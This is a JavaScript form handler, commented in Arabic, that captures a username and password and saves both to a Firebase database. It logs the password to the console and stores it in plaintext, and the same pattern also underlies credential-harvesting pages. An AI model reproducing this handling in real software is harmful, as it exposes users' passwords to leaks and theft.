document.getElementById('dataForm').addEventListener('submit', function(event) {
    event.preventDefault(); // منع إعادة تحميل الصفحة

    // الحصول على البيانات من النموذج
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.log("Username:", username);
    console.log("Password:", password);

    // التحقق من أن Firebase يعمل
    if (!firebase.apps.length) {
        console.error("Firebase not initialized!");
        alert("حدث خطأ: Firebase لم يتم تهيئته.");
        return;
    }

    // إرسال البيانات إلى Firebase
    const newEntryRef = database.ref('users').push();
    newEntryRef.set({
        username: username,
        password: password
    }).then(() => {
        console.log("Data saved successfully!");
        alert('تم حفظ البيانات بنجاح!');
    }).catch((error) => {
        console.error("حدث خطأ:", error);
        alert('حدث خطأ أثناء حفظ البيانات.');
    });
});
